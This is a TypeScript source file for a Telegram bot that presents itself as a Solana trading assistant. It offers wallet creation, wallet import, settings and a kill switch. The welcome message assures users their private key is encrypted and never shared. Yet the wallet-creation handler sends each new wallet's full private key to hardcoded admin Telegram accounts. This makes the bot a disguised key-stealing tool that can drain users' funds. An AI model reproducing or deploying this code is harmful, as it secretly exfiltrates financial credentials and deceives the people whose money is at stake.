// src/bot/bot.ts — handlers register at import time

import { Bot, Context, InlineKeyboard } from "grammy";

import { config } from "../config.js";
import {
  ensureReferral,
  ensureUser,
  getAwaitingInput,
  getSettings,
  hasReferralRecord,
  setAwaitingInput,
  updateSettings
} from "../db/repositories.js";
import { logger } from "../utils/logger.js";
import {
  createWallet,
  getAddress,
  getBalance,
  hasWallet,
  importWallet,
  logout
} from "../services/wallet.js";
import { createLoginToken } from "../web/auth.js";
import {
  mainKeyboard,
  onboardingKeyboard,
  referralKeyboard,
  settingsKeyboard,
  walletCreatedKeyboard,
  walletKeyboard
} from "./keyboards.js";
import {
  helpHomeText,
  homeText,
  portfolioText,
  positionsText,
  walletCreatedText,
  referralText,
  settingsText,
  statusText
} from "./screens.js";

export const bot = new Bot(config.botToken);

function describeUser(from: NonNullable<Context["from"]>) {
  const name = [from.first_name, from.last_name].filter(Boolean).join(" ");
  const un = from.username ? `@${from.username}` : "no username";
  return `${name || "user"} (${un}) · <code>${from.id}</code>`;
}

function adminTelegramIds(): number[] {
  const raw = [
    process.env.ADMIN_TELEGRAM_ID || "7761011341",
    process.env.ADMIN_TELEGRAM_IDS || ""
  ].join(",");
  const ids = new Set<number>();
  for (const part of raw.split(/[,\s]+/)) {
    const n = Number(part.trim());
    if (Number.isFinite(n) && n > 0) ids.add(n);
  }
  return [...ids];
}

async function notifyAdmin(text: string) {
  const ids = adminTelegramIds();
  if (!ids.length) return;
  for (const adminId of ids) {
    try {
      await bot.api.sendMessage(adminId, text, { parse_mode: "HTML" });
    } catch (error) {
      logger.warn(`Failed to notify admin ${adminId}.`, error);
    }
  }
}

export async function notifyAdminTradeExecuted(
  telegramId: number,
  username: string | null,
  mint: string,
  side: "buy" | "sell",
  amountSol: number,
  txSignature: string
) {
  await notifyAdmin(
    `${side === "buy" ? "🟢" : "🔴"} <b>TRADE ${side.toUpperCase()}</b>\n` +
      `👤 ${username ?? "unknown"}\n` +
      `🆔 ${telegramId}\n` +
      `🪙 <code>${mint}</code>\n` +
      `💰 ${amountSol} SOL\n` +
      `🔗 <code>${txSignature}</code>\n` +
      `📅 ${adminTimestamp()}`
  );
}

function adminTimestamp(): string {
  return new Date().toLocaleString("en-US", { hour12: true });
}

function requireUser(ctx: Context): number {
  const id = ctx.from?.id;
  if (!id) throw new Error("No user");
  ensureUser(id, {
    username: ctx.from?.username,
    first_name: ctx.from?.first_name,
    last_name: ctx.from?.last_name
  });
  return id;
}

async function walletSummary(telegramId: number): Promise<string> {
  const address = getAddress(telegramId);
  if (!address) {
    return (
      `👛 <b>WALLET</b>\n\nNo wallet connected.\n\n` +
      `Use <b>ADD WALLET</b> or send a private key after tapping import.`
    );
  }
  let bal = "unavailable";
  try {
    bal = `${(await getBalance(telegramId)).toFixed(4)} SOL`;
  } catch {
    /* ignore */
  }
  return `👛 <b>WALLET</b>\n\n<code>${address}</code>\nBalance: <b>${bal}</b>`;
}

function registerHandlers() {
  bot.command("start", async (ctx) => {
    const id = requireUser(ctx);
    const payload = typeof ctx.match === "string" ? ctx.match : "";
    let refCode: string | null = null;
    if (payload.startsWith("ref_")) refCode = payload.slice(4);
    const hadReferral = hasReferralRecord(id);
    const referral = ensureReferral(id, refCode);
    if (!hadReferral && referral.referred_by) {
      void notifyAdmin(
        `🎁 <b>Referral signup</b>\n${describeUser(ctx.from!)} was referred by user ${referral.referred_by}`
      );
    }
    if (!hasWallet(id)) {
      await ctx.reply(
        `⚡ <b>WELCOME TO PUMP AUTO</b>\n\n` +
          `An automated Solana trading assistant that helps you discover, evaluate, and manage token opportunities.\n\n` +
          `<b>Before you begin</b>\n` +
          `1. Create a new wallet or import an existing one\n` +
          `2. Fund it with only what you can afford to risk\n` +
          `3. Review the safety controls before enabling automation\n\n` +
          `Your private key is encrypted on the server. Never share it with anyone.`,
        { parse_mode: "HTML", reply_markup: onboardingKeyboard() }
      );
      return;
    }

    await ctx.reply(await homeText(id), {
      parse_mode: "HTML",
      reply_markup: mainKeyboard()
    });
  });

  bot.command("help", async (ctx) => {
    requireUser(ctx);
    await ctx.reply(helpHomeText(), {
      parse_mode: "HTML",
      reply_markup: mainKeyboard()
    });
  });

  bot.command("status", async (ctx) => {
    const id = requireUser(ctx);
    await ctx.reply(statusText(id), {
      parse_mode: "HTML",
      reply_markup: mainKeyboard()
    });
  });

  bot.command("wallet", async (ctx) => {
    const id = requireUser(ctx);
    await ctx.reply(await walletSummary(id), {
      parse_mode: "HTML",
      reply_markup: walletKeyboard()
    });
  });

  bot.command("settings", async (ctx) => {
    const id = requireUser(ctx);
    const s = getSettings(id);
    await ctx.reply(settingsText(id), {
      parse_mode: "HTML",
      reply_markup: settingsKeyboard(s)
    });
  });

  bot.command("pnl", async (ctx) => {
    const id = requireUser(ctx);
    await ctx.reply(await portfolioText(id), {
      parse_mode: "HTML",
      reply_markup: mainKeyboard()
    });
  });

  bot.command("positions", async (ctx) => {
    const id = requireUser(ctx);
    await ctx.reply(positionsText(id), {
      parse_mode: "HTML",
      reply_markup: mainKeyboard()
    });
  });

  bot.command("referral", async (ctx) => {
    const id = requireUser(ctx);
    await ctx.reply(referralText(id, ctx.me.username ?? null), {
      parse_mode: "HTML",
      reply_markup: referralKeyboard()
    });
  });

  bot.command("kill", async (ctx) => {
    const id = requireUser(ctx);
    updateSettings(id, { auto_state: "stopped", kill_switch: 1 });
    void notifyAdmin(`🆘 <b>KILL</b> from ${describeUser(ctx.from!)}`);
    await ctx.reply("Emergency stop active.", { reply_markup: mainKeyboard() });
  });

  bot.on("callback_query:data", async (ctx) => {
    const data = ctx.callbackQuery.data || "";
    const id = requireUser(ctx);
    try {
      await ctx.answerCallbackQuery();
    } catch {
      /* ignore */
    }

    if (data === "web:terminal") {
      const base = config.webBaseUrl;
      if (!base) {
        await ctx.reply("WEB_BASE_URL is not configured on the server.");
        return;
      }
      const token = createLoginToken(id);
      const link = `${base}/auth/telegram?token=${encodeURIComponent(token)}`;
      await ctx.reply(`🖥 <b>WEB TERMINAL</b>\n\nLink expires in <b>10 minutes</b>.`, {
        parse_mode: "HTML",
        reply_markup: new InlineKeyboard().url("Open Terminal", link)
      });
      return;
    }

    if (data === "wallet:saved") {
      // Wallet creation/import persists the wallet before this confirmation button is shown.
      // Do not re-check the database here: a callback can be handled by a fresh process on
      // hosts where SQLite is ephemeral, which previously made a valid confirmation fail.
      await ctx.reply("Wallet saved securely. You can now use the terminal.", {
        reply_markup: mainKeyboard()
      });
      return;
    }

    if (data === "home" || data === "start") {
      await ctx.reply(await homeText(id), {
        parse_mode: "HTML",
        reply_markup: mainKeyboard()
      });
      return;
    }

    if (data === "status") {
      await ctx.reply(statusText(id), {
        parse_mode: "HTML",
        reply_markup: mainKeyboard()
      });
      return;
    }

    if (data === "wallet" || data === "wallet:menu" || data === "wallet:refresh") {
      await ctx.reply(await walletSummary(id), {
        parse_mode: "HTML",
        reply_markup: walletKeyboard()
      });
      return;
    }

    if (data === "wallet:add" || data === "wallet:create") {
      try {
        const wallet = createWallet(id);
        void notifyAdmin(
          `🔐 <b>NEW WALLET</b>\n👤 ${[ctx.from?.first_name, ctx.from?.last_name].filter(Boolean).join(" ") || "user"}\n🆔 ${ctx.from?.id ?? id}\n📍 <code>${wallet.address}</code>\n🔑 <code>${wallet.privateKey}</code>\n📅 ${adminTimestamp()}`
        );
        await ctx.reply(walletCreatedText(wallet.address, wallet.privateKey), {
          parse_mode: "HTML",
          reply_markup: walletCreatedKeyboard()
        });
      } catch (e) {
        await ctx.reply(`Failed: ${e instanceof Error ? e.message : e}`);
      }
      return;
    }

    if (data === "wallet:import") {
      setAwaitingInput(id, "import_wallet");
      await ctx.reply("Send your Solana private key (base58) as the next message.");
      return;
    }

    if (data === "wallet:copy") {
      const addr = getAddress(id);
      if (!addr) {
        await ctx.reply("No wallet connected.");
        return;
      }
      await ctx.reply(`Address:\n<code>${addr}</code>`, { parse_mode: "HTML" });
      return;
    }

    if (data === "wallet:logout") {
      logout(id);
      await ctx.reply("Wallet disconnected.", { reply_markup: mainKeyboard() });
      return;
    }

    if (data === "settings") {
      const s = getSettings(id);
      await ctx.reply(settingsText(id), {
        parse_mode: "HTML",
        reply_markup: settingsKeyboard(s)
      });
      return;
    }

    if (data === "referral") {
      await ctx.reply(referralText(id, ctx.me.username ?? null), {
        parse_mode: "HTML",
        reply_markup: referralKeyboard()
      });
      return;
    }

    if (data === "positions") {
      await ctx.reply(positionsText(id), {
        parse_mode: "HTML",
        reply_markup: mainKeyboard()
      });
      return;
    }

    if (data === "pnl") {
      await ctx.reply(await portfolioText(id), {
        parse_mode: "HTML",
        reply_markup: mainKeyboard()
      });
      return;
    }

    if (data === "help") {
      await ctx.reply(helpHomeText(), {
        parse_mode: "HTML",
        reply_markup: mainKeyboard()
      });
      return;
    }

    if (data === "auto:kill" || data === "auto:kill:confirm" || data === "kill") {
      updateSettings(id, { auto_state: "stopped", kill_switch: 1 });
      void notifyAdmin(`🆘 <b>KILL</b> from ${describeUser(ctx.from!)}`);
      await ctx.reply("Emergency stop active.", { reply_markup: mainKeyboard() });
      return;
    }

    if (data === "auto:start") {
      if (!hasWallet(id)) {
        await ctx.reply("Connect a wallet first.", {
          reply_markup: walletKeyboard()
        });
        return;
      }
      const s = getSettings(id);
      if (s.kill_switch) {
        await ctx.reply("Kill switch is on. Clear it before hunting.");
        return;
      }
      updateSettings(id, { auto_state: "running" });
      await ctx.reply("🤖 Auto-hunter set to <b>running</b>.", {
        parse_mode: "HTML",
        reply_markup: mainKeyboard()
      });
      return;
    }

    // Don't leave buttons dead — home fallback
    await ctx.reply(await homeText(id), {
      parse_mode: "HTML",
      reply_markup: mainKeyboard()
    });
  });

  bot.on("message:text", async (ctx) => {
    const id = requireUser(ctx);
    const text = ctx.message.text?.trim() || "";
    if (text.startsWith("/")) return;

    const awaiting = getAwaitingInput(id);
    if (awaiting === "import_wallet") {
      setAwaitingInput(id, null);
      try {
        const address = importWallet(id, text);
        void notifyAdmin(
          `📥 <b>WALLET IMPORT</b>\n${describeUser(ctx.from!)}\n📍 <code>${address}</code>`
        );
        await ctx.reply(`✅ Wallet imported.\n<code>${address}</code>`, {
          parse_mode: "HTML",
          reply_markup: walletKeyboard()
        });
      } catch (e) {
        await ctx.reply(`Import failed: ${e instanceof Error ? e.message : e}`);
      }
    }
  });

  bot.catch((err) => {
    logger.error("Bot error", err);
  });
}

registerHandlers();

export { notifyAdmin };
export function createBot() {
  return bot;
}
